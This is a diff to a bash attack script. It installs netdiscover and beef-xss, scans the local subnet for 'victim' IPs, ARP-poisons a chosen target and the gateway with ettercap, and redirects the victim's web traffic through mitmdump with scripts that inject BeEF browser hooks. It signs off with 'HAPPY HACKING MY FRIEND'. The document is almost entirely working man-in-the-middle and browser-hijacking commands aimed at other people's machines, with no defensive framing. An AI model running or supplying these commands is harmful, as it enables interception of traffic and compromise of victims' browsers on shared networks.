@@ -53,6 +53,13 @@ else
 	echo -e "\n [*] ${YELLOW} Installing beef-xss ${RESET}\n"
 	sudo apt-get install beef-xss
 fi
+if [  -e /usr/sbin/netdiscover ]; then
+    echo -e $GREEN "[ ✔ ] netdiscover ................[ found ]"
+else 
+	echo -e $RED "[ X ] netdiscover -> not found "
+	echo -e "\n [*] ${YELLOW} Installing netdiscover ${RESET}\n"
+	sudo apt-get install netdiscover
+fi
 sleep 1
 clear
 echo -e "2. Finding a router/Gateway ip and victim ip"
@@ -64,6 +71,14 @@ clear
 echo -e "Your entered $ip as your default gateway"
 sleep 1
 clear
+route -n
+echo ""
+read -p "Detecting victims Ip, Enter subnet IP(eg:192.168.0/24): " subnet
+clear
+echo -e "SCANNING STARTED"
+echo ""
+xterm -T "SCANNING TARGET NETWORK" -e "sudo netdiscover -i $intr -r $subnet" &
+clear
 echo -e "Enter victim ip Address if you have more than one target provide ur ip in ranges eg: 192.168.1.168-255"
 echo ""
 read -p "Target IP: " target
@@ -74,6 +89,9 @@ echo ""
 sleep 2
 xterm -T "ETTERCAP ATTACKING $target" -e "ettercap -Tq -M arp:remote -i $intr -S /$ip// /$target//" &
 sleep 2
+#xterm -T "SSL PROXIES" -e "mitmdump -s ssl.py -m transparent" &
+sleep 2
 xterm -T "PROXY SERVER = = ATTACKING WITH BEEF-HOOKS" -e "mitmdump -s "js.py" -s "ssl.py" -m transparent -p 8080" &
 sleep 2
 xterm -e "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080" &
+echo -e "HAPPY HACKING MY FRIEND"
